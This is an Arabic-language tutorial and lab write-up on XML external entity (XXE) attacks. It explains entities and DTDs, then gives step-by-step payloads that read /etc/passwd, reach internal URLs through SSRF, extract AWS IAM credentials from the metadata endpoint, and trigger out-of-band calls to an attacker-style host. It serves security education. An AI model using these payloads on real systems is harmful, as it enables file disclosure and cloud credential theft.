+<p><strong>قراءة ملفات السيرفر (Read local files):</strong> يقدر يخلي السيرفر يعرضله محتوى ملفات حساسة موجودة على النظام نفسه (زي ملفات الإعدادات، أو ملف <code>etc/passwd/</code> في لينكس).</p>
+</li>
+<li>
+<p><strong>القيام بهجمات SSRF:</strong> يقدر يستغل السيرفر المصاب كأنه "كوبري" عشان يتصل بأنظمة تانية (سواء داخل الشبكة الداخلية للشركة أو خارجية)، ودي بتعرف بثغرة الـ Server-Side Request Forgery.</p>
+</li>
+</ul>
+<h3 id="2-how-do-xxe-vulnerabilities-arise">2. إزاي الثغرة دي بتحصل؟ (How do XXE vulnerabilities arise?)</h3>
+<p>المشكلة الأساسية مش في لغة الـ XML نفسها، المشكلة في <strong>البرامج والمكتبات (XML Parsers/APIs)</strong> اللي بتُستخدم عشان تقرأ وتفهم الـ XML على السيرفر. مواصفات الـ XML الأصلية فيها مميزات (Features) قديمة ومعقدة، والمشكلة إن كتير من الـ Parsers دي بتبقى مفعّلة المميزات دي بشكل افتراضي (By default)، حتى لو التطبيق اللي إنت بتستخدمه مش محتاجها خالص.</p>
+<hr />
+<h3 id="xml-what-is-xml">طيب في الاول إيه هو الـ XML أصلاً؟ (What is XML?)</h3>
+<p>الـ <strong>XML</strong> (Extensible Markup Language) دي لغة معمولة عشان <strong>تخزن وتنقل البيانات</strong>.</p>
+<ul>
+<li>
+<p><strong>شبه الـ HTML:</strong> لأنها بتستخدم "تاجز" (Tags) زي <code>&lt;name&gt;</code> و <code>&lt;/name&gt;</code>.</p>
+</li>
+<li>
+<p><strong>مختلفة عن الـ HTML:</strong> الـ HTML التاجز بتاعته ثابتة ومحفوظة (زي <code>&lt;h1&gt;</code> أو <code>&lt;p&gt;</code>)، لكن في الـ XML إنت اللي بتخترع التاجز براحتك عشان توصف البيانات بتاعتك (مثلاً <code>&lt;username&gt;Jimmy&lt;/username&gt;</code>).</p>
+</li>
+<li>
+<p><strong>معلومة سريعة:</strong> زمان كان الـ XML هو المعلم في نقل البيانات (حتى حرف الـ X في كلمة AJAX اختصار ليه)، بس دلوقتي الـ <strong>JSON</strong> بقى أشهر وأخف منه بكتير.</p>
+</li>
+</ul>
+<h3 id="1-xml-entities">1. إيه هي الـ XML Entities؟ (الكيانات)</h3>
+<p>عشان نبسطها، اعتبر الـ Entity ده كأنه <strong>"اختصار"</strong> أو <strong>"متغير" (Variable)</strong>. في الـ XML، في حروف معينة محجوزة للغة نفسها، زي علامة الأكبر من <code>&gt;</code> والأصغر من <code>&lt;</code>. لو إنت عاوز تكتب الحروف دي جوه البيانات بتاعتك من غير ما السيرفر يفتكرها بداية "تاج" جديد، بتستخدم الـ Built-in Entities.</p>
+<ul>
+<li>
+<p>مثلاً: بدل ما تكتب <code>&lt;</code> بتكتب <code>&amp;lt;</code> (اختصار Less than).</p>
+</li>
+<li>
+<p>وبدل ما تكتب <code>&gt;</code> بتكتب <code>&amp;gt;</code> (اختصار Greater than).</p>
+</li>
+</ul>
+<h3 id="2-dtd-document-type-definition">2. إيه هو الـ DTD (Document Type Definition)؟</h3>
+<p>الـ DTD ده عامل زي <strong>"كتالوج القواعد"</strong> بتاع ملف الـ XML. ده جزء بيتكتب في أول الملف خالص (جوه تاج اسمه <code>&lt;!DOCTYPE&gt;</code>)، وظيفته إنه يعرّف السيرفر إيه هي هيكلة الملف، وإيه البيانات المسموح بيها، وإيه "الاختصارات" (Entities) اللي هنستخدمها جوه الملف ده. الـ DTD ممكن يكون مكتوب جوه الملف نفسه، أو بيتعمله استدعاء من ملف خارجي.</p>
+<h3 id="3-custom-entities">3. إيه هي الـ Custom Entities؟ (الكيانات المخصصة)</h3>
+<p>الـ XML بيديك ميزة إنك تخترع "اختصارات" أو "متغيرات" خاصة بيك جوه الـ DTD.</p>
+<ul>
+<li><strong>مثال:</strong></li>
+</ul>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;Jimmy&quot; &gt; ]&gt;
+</code></pre>
+<ul>
+<li>
+<p><strong>المعنى:</strong> إنت هنا بتقول للسيرفر: "بص، أنا عملت متغير اسمه <code>myentity</code> وقيمته <code>Jimmy</code>".</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> أي مكان جوه ملف الـ XML هتكتب فيه <code>&amp;myentity;</code>، السيرفر وهو بيقرأ الملف هيقوم ماسح الكلمة دي وحاطط مكانها <code>Jimmy</code>.</p>
+</li>
+</ul>
+<h3 id="4-external-entities">4. الطامة الكبرى: الـ External Entities 🚨</h3>
+<p>هنا بقى بيبدأ الخطر اللي بيعمل ثغرة الـ XXE. الـ External Entities هي عبارة عن "متغيرات" إنت بتعملها، بس <strong>قيمتها مش مكتوبة في الملف</strong>، قيمتها بيتم استدعائها من <strong>مصدر خارجي</strong> (External Source).</p>
+<p>عشان تعمل ده، بتستخدم كلمة سرية اسمها <code>SYSTEM</code>، وتديها الرابط (URL) أو مسار الملف اللي السيرفر المفروض يروح يجيب القيمة منه:</p>
+<ul>
+<li><strong>استدعاء من رابط:</strong></li>
+</ul>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;
+</code></pre>
+<ul>
+<li><strong>استدعاء من ملف على الجهاز نفسه (وهنا الكارثة):</strong></li>
+</ul>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;
+</code></pre>
+<ul>
+<li><strong>المعنى:</strong> إنت بتقول للسيرفر: "روح افتح الملف اللي في المسار ده، وخد الكلام اللي جواه كله، وخليه هو قيمة المتغير اللي اسمه <code>ext</code>".</li>
+</ul>
+<p>لما السيرفر يعالج (Parse) الملف وييجي يرد عليك، هيرد عليك بالبيانات بعد ما عوض عنها، وبالتالي هتلاقي محتوى الملف السري اللي على السيرفر ظاهر قدامك على الشاشة!</p>
+<p>الأساسيات دي هي اللي بتبني عليها كل هجمات الـ XXE. تحب ندخل دلوقتي في أمثلة عملية ونشوف إزاي المهاجم بيكتب الـ Payload عشان يقدر يسحب ملفات حساسة من السيرفر؟</p>
+<hr />
+<h3 id="3-xxe">3. إيه هي أنواع هجمات الـ XXE؟</h3>
+<p>المقال قسمهم لـ 4 أنواع رئيسية، هقولهملك باختصار عشان تبقى شايف الصورة كاملة:</p>
+<ul>
+<li>
+<p><strong>استخراج الملفات (Retrieve files):</strong> وده اللي هنشرحه بالتفصيل دلوقتي، إنك تقرأ ملفات حساسة من السيرفر.</p>
+</li>
+<li>
+<p><strong>هجوم SSRF:</strong> إنك تستخدم السيرفر كـ "كوبري" عشان تتصل بأجهزة تانية في الشبكة الداخلية للشركة.</p>
+</li>
+<li>
+<p><strong>الـ Blind XXE (الاستخراج الخفي - Out-of-band):</strong> ده بيحصل لما السيرفر يكون مصاب بالثغرة، بس <strong>مش بيرد عليك بالبيانات على الشاشة</strong>. فبتضطر تعمل حيلة وتخلي السيرفر يبعت الملفات دي لسيرفر تاني بتاعك إنت (Attacker Server).</p>
+</li>
+<li>
+<p><strong>الـ Blind XXE عبر رسائل الخطأ (Error messages):</strong> برضه السيرفر مش بيعرض البيانات، بس إنت بتتعمد تبوظ حاجة في الـ XML عشان السيرفر يطلع رسالة "Error"، وبتخلي الرسالة دي تفضح جزء من البيانات الحساسة.</p>
+</li>
+</ul>
+<hr />
+<h3 id="exploiting-xxe-to-retrieve-files">إزاي بننفذ هجوم استخراج الملفات؟ (Exploiting XXE to retrieve files)</h3>
+<p>عشان تسرق ملف (زي ملف الباسوردات <code>etc/passwd/</code> في لينكس)، لازم تعمل حاجتين أساسيتين في طلب الـ XML اللي بتبعته:</p>
+<ol>
+<li>
+<p><strong>تكتب الـ DOCTYPE:</strong> وتعرف جواه External Entity بيبص على مسار الملف اللي عاوز تسرقه.</p>
+</li>
+<li>
+<p><strong>تستدعي الـ Entity:</strong> تحط اسم الـ Entity ده جوه "تاج" (Tag) من التاجات اللي التطبيق متعود <strong>يعرضها في الرد بتاعه (Response)</strong>.</p>
+</li>
+</ol>
+<h4 id="_1">💡 تعال نشوف المثال العملي (السيناريو):</h4>
+<p>تخيل إنك في موقع تسوق، وبتضغط على زرار "تحقق من المخزون" (Check Stock) عشان تشوف المنتج رقم 381 متاح ولا لأ. المتصفح بيبعت للسيرفر ملف XML بريء جداً شكله كده:</p>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;381&lt;/productId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p>السيرفر بياخد الرقم "381"، يدور عليه، ويرد عليك يقولك مثلاً: "المنتج 381 متاح منه 5 قطع". (هنا السيرفر <strong>بيعكس</strong> أو <strong>بيعرض</strong> رقم المنتج اللي إنت بعتهوله في الرد).</p>
+<h4 id="the-payload">😈 الهجوم (The Payload):</h4>
+<p>بما إن السيرفر مش متأمن، إنت هتبعتله الـ XML ده بدل العادي:</p>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p><strong>إيه اللي حصل هنا؟</strong></p>
+<ol>
+<li>
+<p>إنت ضفت السطر بتاع <code>&lt;!DOCTYPE...</code> وعملت متغير سميته <code>xxe</code>، وقولت للسيرفر إن قيمته هي محتوى ملف <code>etc/passwd/</code>.</p>
+</li>
+<li>
+<p>بدل ما تبعت رقم المنتج 381، بعت المتغير بتاعك <code>&amp;xxe;</code>.</p>
+</li>
+</ol>
+<p><strong>رد فعل السيرفر (الكارثة):</strong> السيرفر هياخد الـ <code>&amp;xxe;</code> ويحط مكانها كل الكلام اللي جوه ملف الباسوردات. ولما ييجي يدور في قاعدة البيانات على منتج بالاسم العجيب ده، مش هيلاقي حاجة، فهيرد عليك برسالة خطأ بيقولك فيها إن الـ ID ده غلط، <strong>بس هيطبعلك محتوى الملف كله على الشاشة!</strong></p>
+<p>Plaintext</p>
+<pre><code>Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+</code></pre>
+<h3 id="pro-tip">📌 ملاحظة مهمة جداً للشغل في الواقع (Pro Tip):</h3>
+<p>في الحقيقة، ملفات الـ XML اللي بتتبعت للسيرفر بتبقى مليانة "تاجات" (Nodes) كتير جداً، مش بس <code>productId</code>. عشان تكتشف الثغرة دي بنجاح، لازم تجرب تحط الـ Entity بتاعك <code>&amp;xxe;</code> في كل حقل (Field) لوحده وتشوف هل السيرفر هيعرضه في الـ Response ولا لأ، لأن مش كل الحقول السيرفر بيرد بيها على المستخدم.</p>
+<hr />
+<h3 id="exploiting-xxe-using-external-entities-to-retrieve-files">حل لاب Exploiting XXE using external entities to retrieve files :</h3>
+<h3 id="intercepting-the-request">الخطوة الأولى: اصطياد الطلب (Intercepting the Request)</h3>
+<blockquote>
+<p><strong>المكتوب:</strong> Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.</p>
+</blockquote>
+<ul>
+<li>
+<p><strong>التفسير:</strong> لما بتدخل على صفحة أي منتج وتدوس على زرار "Check stock" (التحقق من المخزون)، المتصفح بتاعك بيبعت طلب من نوع <strong>POST</strong> للسيرفر. الطلب ده جواه بيانات المنتج مكتوبة بصيغة XML.</p>
+</li>
+<li>
+<p><strong>دورك هنا:</strong> بتشغل أداة الـ Proxy في Burp Suite وتعمل <strong>Intercept On</strong> عشان توقف الطلب ده قبل ما يروح للسيرفر. بعد ما تمسكه، هتبعته لـ <strong>Repeater</strong> عشان تقدر تعدل فيه براحتك وتبعته كذا مرة وتشوف الرد.</p>
+</li>
+</ul>
+<p>شكل الطلب الأصلي في Burp هيبقى عامل كده تقريباً:</p>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;1&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<h3 id="defining-the-external-entity">الخطوة التانية: زرع القنبلة (Defining the External Entity)</h3>
+<blockquote>
+<p><strong>المكتوب:</strong> Insert the following external entity definition in between the XML declaration and the stockCheck element...</p>
+</blockquote>
+<ul>
+<li>
+<p><strong>التفسير:</strong> إنت هنا بتعدل في هيكل الـ XML نفسه. هتيجي بعد السطر الأول (اللي هو إعلان الـ XML) وقبل تاج <code>&lt;stockCheck&gt;</code>، وتقوم حاطط الكود الخبيث بتاعك.</p>
+</li>
+<li>
+<p><strong>الكود هو:</strong> <code>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code></p>
+</li>
+<li>
+<p><strong>معناه إيه؟</strong> إنت بتقول للسيرفر: "أنا بعمل قواعد جديدة (DOCTYPE) للملف ده. جوه القواعد دي، أنا اخترعت متغير (Entity) سميته <code>xxe</code>، وقيمته مش هكتبهالك هنا، لأ.. أنا عاوزك تروح تقرأ الملف اللي موجود على نظام التشغيل بتاعك في المسار <code>etc/passwd/</code> وتحط محتواه كله كقيمة للمتغير ده".</p>
+</li>
+</ul>
+<p>شكل الطلب بعد التعديل هيبقى كده:</p>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;1&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p><em>لحد هنا، إنت جهزت المتغير بس لسه ما استخدمتوش، فالسيرفر مش هيعرض حاجة.</em></p>
+<h3 id="triggering-the-exploit">الخطوة الثالثة: تفجير الثغرة (Triggering the Exploit)</h3>
+<blockquote>
+<p><strong>المكتوب:</strong> Replace the productId number with a reference to the external entity: &xxe;</p>
+</blockquote>
+<ul>
+<li><strong>التفسير:</strong> دي اللحظة الحاسمة. إنت هتروح للتاج بتاع <code>&lt;productId&gt;</code> وتمسح الرقم اللي جواه (اللي هو 1 مثلاً)، وتحط مكانه المتغير اللي إنت لسه مخترعه <code>&amp;xxe;</code>.</li>
+</ul>
+<p>الطلب النهائي اللي هتبعته للسيرفر هيبقى شكله كده:</p>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<h3 id="_2">النتيجة (إيه اللي بيحصل في الكواليس؟)</h3>
+<p>لما بتدوس <strong>Send</strong> في الـ Repeater، السيرفر بياخد الملف ده ويبدأ يقارئه (Parsing):</p>
+<ol>
+<li>
+<p>هيشوف المتغير <code>&amp;xxe;</code>.</p>
+</li>
+<li>
+<p>هيروح يبص في الـ DOCTYPE، هيلاقيك بتقوله "هات محتوى <code>etc/passwd/</code>".</p>
+</li>
+<li>
+<p>السيرفر (عشان مصاب بالثغرة) هيروح فعلاً يفتح الملف ده عنده، وياخد كل السطور اللي فيه.</p>
+</li>
+<li>
+<p>هيشيل كلمة <code>&amp;xxe;</code> ويحط مكانها محتوى الملف كله جوه تاج الـ <code>&lt;productId&gt;</code>.</p>
+</li>
+<li>
+<p>السيرفر دلوقتي بيحاول يدور في الداتا بيز على منتج الـ ID بتاعه هو (محتوى ملف الباسوردات بالكامل)!</p>
+</li>
+<li>
+<p>طبعاً مش هيلاقي منتج بالرقم العجيب ده، فهيرد عليك برسالة خطأ (Error Message) بيقولك فيها: <code>"Invalid product ID:"</code> وهيقوم طابعلك الـ ID اللي هو حاول يدور عليه (اللي هو في الحالتنا دي، <strong>محتوى ملف الـ passwd السري بالكامل</strong>).</p>
+</li>
+</ol>
+<p>وبكده تبقى نجحت تستغل ثغرة الـ XXE عشان تقرأ ملفات حساسة من السيرفر!
+ملحوظة: ذي ما قولنا فوق مش دايما هيكون هيكون مكان ال variable في الاول هو الصح هتحتاج تدور علي المكان اليشتغل فيه و بالاخص لو في اكثر من مكان.</p>
+<hr />
+<p>يا بطل، إنت كده دخلت في "ليفل الوحش"! الجزء ده بيشرح إزاي نستخدم ثغرة الـ XXE عشان ننفذ هجوم تاني خطير جداً اسمه <strong>SSRF</strong> (Server-Side Request Forgery أو تزوير الطلبات من جهة الخادم).</p>
+<p>تعالى نفهم الفكرة دي بتفاصيلها الممتعة:</p>
+<h2 id="ssrf-xxe">يعني إيه SSRF من خلال الـ XXE؟</h2>
+<p>في الهجوم اللي فات (قراءة الملفات)، إنا كنا بنخلي السيرفر يفتح ملف جوه جهازه (زي <code>file:///etc/passwd</code>). في هجوم الـ SSRF، إحنا بنغير الخطة؛ بدل ما نطلب <strong>ملف</strong>، بنطلب <strong>رابط (URL)</strong>.</p>
+<p>الفكرة هنا إنك بتستغل السيرفر كأنه "كوبري" (Proxy). الشركات بيبقى عندها شبكة داخلية (Internal Network) فيها سيرفرات تانية ولوحات تحكم خاصة بالموظفين، مستحيل توصلها من بره على الإنترنت. بس السيرفر المصاب بالثغرة <em>يقدر</em> يوصلها لأنه جزء من الشبكة دي! فإنت بتأمره يروح يفتح الرابط الداخلي ده نيابة عنك.</p>
+<h2 id="the-payload_1">إزاي بننفذ الهجوم؟ (The Payload)</h2>
+<p>نفس الخطوات اللي عملناها في اللاب اللي فات بالظبط، بس كل اللي بيتغير هو الـ Protocol اللي بنستخدمه في الـ External Entity. بدل ما نكتب <code>file://</code> هنكتب <code>http://</code>.</p>
+<p>المقال ضربلك المثال ده:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://internal.vulnerable-website.com/&quot;&gt; ]&gt;
+</code></pre>
+<p><strong>إيه اللي بيحصل هنا؟</strong> إنت بتعرف المتغير <code>xxe</code>، وبتقول للسيرفر: "قيمته هي المحتوى اللي هيرجعلك لما تفتح الرابط الداخلي <code>[http://internal.vulnerable-website.com/](http://internal.vulnerable-website.com/)</code>".</p>
+<h2 id="_3">سيناريوهات الهجوم (النتائج)</h2>
+<p>لما السيرفر بينفذ الطلب ده، بيحصل حاجة من اتنين:</p>
+<ol>
+<li>
+<p><strong>تفاعل كامل (Two-way interaction):</strong> لو التاج اللي إنت حطيت فيه المتغير (زي <code>&lt;productId&gt;</code>) بيتعرض في الرد بتاع السيرفر (Response)، السيرفر هياخد الـ HTML أو البيانات بتاعة الموقع الداخلي ده ويطبعها لك على الشاشة. إنت كده بقيت تتصفح الشبكة الداخلية للشركة وأنت قاعد في بيتك!</p>
+</li>
+<li>
+<p><strong>هجوم أعمى (Blind SSRF):</strong> لو السيرفر قفلها في وشك ومش بيعرض البيانات اللي طلبها، الهجوم ده لسه خطير! ليه؟ لأن السيرفر <em>بالفعل نفذ الطلب</em> وراح زار الرابط. تخيل لو الرابط ده كان بينفذ أمر معين (مثلاً رابط داخلي بيمسح مستخدم أو بيقفل خدمة زي <code>http://internal-admin/delete?user=admin</code>)، السيرفر هينفذ الأمر ده حتى لو مش هتشوف النتيجة بعينك.</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>خلاصة:</strong> الـ SSRF بيحول ثغرة الـ XXE من مجرد "تسريب ملفات" لـ "اختراق للشبكة الداخلية"، وده اللي بيخلي تصنيفها دايماً عالي جداً في تقييم الخطورة (Critical).</p>
+</blockquote>
+<hr />
+<h3 id="exploiting-xxe-to-perform-ssrf-attacks">حل لاب Exploiting XXE to perform SSRF attacks :</h3>
+<p>قبل ما نحل، لازم تفهم إيه هو الرابط ده: <code>[http://169.254.169.254/](http://169.254.169.254/)</code>.</p>
+<blockquote>
+<p>في عالم الحوسبة السحابية (زي AWS AWS/EC2)، الرابط ده عبارة عن <strong>Link-Local Address</strong>. السيرفر بيستخدمه داخلياً عشان يكلم "نظام الإدارة" بتاع أمازون ويجيب منه معلومات عن السيرفر نفسه (زي اسم السيرفر، الشبكة، والأهم: بيانات تسجيل الدخول الصالحة للملحقات أو الـ IAM Roles). الرابط ده مش متاح للعامة على الإنترنت، بس السيرفر نفسه يقدر يقرأه!</p>
+</blockquote>
+<p>بما إننا مش عارفين المسار الكامل للـ Secret Key بالظبط جوه اللاب، إحنا هنمشي بأسلوب الاستكشاف (Directory Crawling) خطوة بخطوة.</p>
+<h2 id="_4">خطوات حل اللاب بالتفصيل</h2>
+<p><strong>1.اصطياد الطلب بـ Burp Suite:</strong>الخطوة الأولى.</p>
+<p>ادخل على صفحة أي منتج، ودوس على زرار <strong>Check stock</strong>. امسك الطلب (Intercept) في Burp Suite وابعت الطلب لـ <strong>Repeater</strong>. الطلب الأصلي هيكون ملف XML عادي بيبعت الـ <code>productId</code>.</p>
+<p><strong>2.استكشاف المسار الرئيسي للـ Metadata:</strong>الخطوة الثانية.</p>
+<p>هنعدل الطلب عشان نخلي السيرفر يزور الرابط السحري ويقولنا إيه اللي جواه. حط الـ Payload ده:</p>
+<p>XML</p>
+<pre><code>
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt; ]&gt;
+
+&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+</code></pre>
+<p>لما تدوس <strong>Send</strong>، السيرفر هيرد عليك ويقولك إن جواه فولدر اسمه <code>latest</code>.</p>
+<p><strong>3.تتبع الفولدرات خطوة بخطوة:</strong>الخطوة الثالثة.</p>
+<p>كل ما السيرفر يديك اسم فولدر، زود الاسم ده في الرابط وابعت تاني. هتفضل تعدل الرابط كالتالي:</p>
+<ul>
+<li>
+<p>أولاً هتبعت لـ: <code>[http://169.254.169.254/latest/](http://169.254.169.254/latest/)</code> (السيرفر هيرد بـ <code>meta-data</code>).</p>
+</li>
+<li>
+<p>ثانياً هتبعت لـ: <code>[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)</code> (السيرفر هيرد بقائمة فولدرات، منها <code>iam</code>).</p>
+</li>
+<li>
+<p>ثالثاً هتبعت لـ: <code>[http://169.254.169.254/latest/meta-data/iam/](http://169.254.169.254/latest/meta-data/iam/)</code> (السيرفر هيرد بـ <code>security-credentials</code>).</p>
+</li>
+</ul>
+<p><strong>4.معرفة اسم الـ Role:</strong>الخطوة الرابعة.</p>
+<p>ابعت الطلب للمسار الأخير اللي وصلنا له:</p>
+<p>XML</p>
+<pre><code>
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;&gt; ]&gt;
+
+&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+</code></pre>
+<p>لما تدوس <strong>Send</strong>، السيرفر هيرد عليك باسم الـ Role المربوطة بالجهاز ده (مثلاً هيكون اسمها <code>admin</code> أو <code>ec2-user</code> أو أي اسم عشوائي اللاب عامله).</p>
+<p><strong>5.استخراج الـ Secret Access Key وحل اللاب:</strong>الخطوة الخامسة والأخيرة.</p>
+<p>خد الاسم اللي ظهرلك في الخطوة اللي فاتت (نفرض مثلاً إن الاسم طلع <code>admin</code>)، وحطه في نهاية الرابط بالشكل ده:</p>
+<p>XML</p>
+<pre><code>
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt; ]&gt;
+
+&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+</code></pre>
+<p>دوس <strong>Send</strong>، السيرفر هيروح للمسار النهائي ده ويرد عليك بملف <strong>JSON</strong> كامل جواه الـ <code>AccessKeyId</code> والـ <code>SecretAccessKey</code> وكده مبروك عليك حل اللاب واختراق السيرفر!</p>
+<p>و هيكون بالشكل ده :</p>
+<pre><code>&quot;Invalid product ID: {
+  &quot;Code&quot; : &quot;Success&quot;,
+  &quot;LastUpdated&quot; : &quot;2026-06-24T15:19:26.380987921Z&quot;,
+  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot; : &quot;fVAZFuJoRGTWyg2Uu0iw&quot;,
+  &quot;SecretAccessKey&quot; : &quot;yYHoqUAf7z91IqInR060hbuigKBv18DlV4V7fkcZ&quot;,
+  &quot;Token&quot; : &quot;yrqcOlrH3T6vczMN42GLrIVocengd7wwbX7LtOdiWHYWDBL8UgkFBlUvFfUQtDLCMIEzDlqgZc1ld3qreMlFCKLViYcyW0eeSbkpLUSCF7y9z4PZOtTV3D6C7dK9BcYfthf0VFrtMF7EdZpH7QGJisQVBqnJuEK6cdPTCMnIu3zEnPZNCzmqcpPwG4PSqKRnt7nMjOOIpT56YOciHm9jDu7zFafezcIFZrVKJGAaIbgvwpZntQpK2wVwKYGBSd0v&quot;,
+  &quot;Expiration&quot; : &quot;2032-06-22T15:19:26.380987921Z&quot;
+}&quot;
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>ملاحظة أمنية لحياتك العملية:</strong> الهجوم ده بالظبط هو اللي اتسبب في اختراق شركة <strong>Capital One</strong> الشهيرة سنة 2019 وتسريب بيانات ملايين العملاء، لما المهاجم استغل ثغرة SSRF عشان يوصل لنفس الـ IP ده وسحب مفاتيح AWS المخزنة عليه. حالياً AWS حدثت النظام لـ IMDSv2 عشان تمنع الهجمات دي، بس لسه في سيرفرات كتير شغالة بالنظام القديم ده!</p>
+</blockquote>
+<hr />
+<h3 id="blind-xxe">دلوقتي ندخل علي ال Blind XXE :</h3>
+<p>زي ما إنت شفت في اللابات اللي فاتت، كنا بنكتب الـ Payload ونشوف النتيجة قدامنا في الـ Response، سواء كان ملف الباسوردات أو المفتاح السري بتاع أمازون. لكن في الـ Blind XXE، السيرفر بيبقى "كتوم".. بينفذ الكود بتاعنا بس <strong>مش بيعرض أي حاجة على الشاشة</strong>.</p>
+<p>عشان كده اختراقه بيبقى أصعب شوية، بس الهاكرز لقوله طريقتين أساسيتين عشان يوقعوه:</p>
+<h2 id="blind-xxe_1">طرق استغلال الـ Blind XXE</h2>
+<ol>
+<li>
+<p><strong>التفاعل الخارجي (Out-of-Band - OAST):</strong> بنخلي السيرفر بدل ما يرد علينا في المتصفح، يبعت هو البيانات لسيرفر تاني إحنا (كمهاجمين) بنتحكم فيه.</p>
+</li>
+<li>
+<p><strong>رسائل الخطأ (Error-based):</strong> بنعمل خدعة في الكود تخلي الـ XML Parser يضرب ويطلع رسالة خطأ (Crash)، وبنجبره يحط البيانات الحساسة اللي سرقناها جوه نص رسالة الخطأ دي!</p>
+</li>
+</ol>
+<h2 id="oast">إزاي بنكتشف الثغرة أصلاً بطريقة OAST؟</h2>
+<p>بما إن السيرفر مش بيرد علينا، إحنا محتاجين نتأكد الأول هو مصاب أصلاً ولا لأ قبل ما نتعب نفسنا ونحاول نسرق بيانات. بنعمل ده باستخدام نفس فكرة الـ SSRF اللي لسه شارحينها.</p>
+<p>بنبني Payload زي ده:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; ]&gt;
+</code></pre>
+<p><strong>إيه اللي بيحصل في الكواليس؟</strong></p>
+<ul>
+<li>
+<p>إنت بتعمل متغير اسمه <code>xxe</code> وبتقول للسيرفر: "روح افتح الرابط ده".</p>
+</li>
+<li>
+<p>الرابط ده مش رابط داخلي للشركة، ده رابط <strong>سيرفر بتاعك إنت</strong> (في Burp Suite بنستخدم أداة عبقرية اسمها <strong>Burp Collaborator</strong> بتديك رابط مخصص تصطاد بيه الطلبات دي).</p>
+</li>
+<li>
+<p>لما بتبعت ملف الـ XML للسيرفر وتستدعي المتغير، السيرفر بينفذ الأمر ويروح يزور الرابط بتاعك.</p>
+</li>
+<li>
+<p>إنت بتفتح لوحة التحكم بتاعتك (الـ Collaborator Client)، لو لقيت إن في جهاز عمل اتصال (DNS Lookup أو HTTP Request) بالرابط ده، بتعرف فوراً إن السيرفر ده مصاب بثغرة XXE وإنه بينفذ أوامرك "على العمياني"!</p>
+</li>
+</ul>
+<p>بمجرد ما تتأكد إنه مصاب، بتبدأ المرحلة اللي بعدها: إزاي تخلي السيرفر وهو بيزور موقعك، يسحب معاه ملف حساس (زي <code>etc/passwd/</code>) ويبعتهولك!</p>
+<hr />
+<p>حل لاب Blind XXE with out-of-band interaction :</p>
+<p><strong>الهدف من اللاب:</strong> إثبات وجود ثغرة XXE عمياء (Blind) في السيرفر عن طريق إجباره على الاتصال بسيرفر خارجي نتحكم فيه (Burp Collaborator)، لأن السيرفر مش بيرد بأي بيانات على الشاشة.</p>
+<h3 id="1-intercept-the-request">📥 الخطوة 1: اصطياد الطلب (Intercept the Request)</h3>
+<ul>
+<li>
+<p><strong>ماذا تفعل:</strong> ادخل على صفحة أي منتج، واضغط على زرار <strong>Check stock</strong>.</p>
+</li>
+<li>
+<p><strong>في Burp Suite:</strong> شغّل الـ Intercept عشان تمسك طلب الـ <strong>POST</strong> الخاص بالعملية دي، وبعدين ابعته للـ <strong>Repeater</strong> عشان نعدل فيه براحتنا.</p>
+</li>
+</ul>
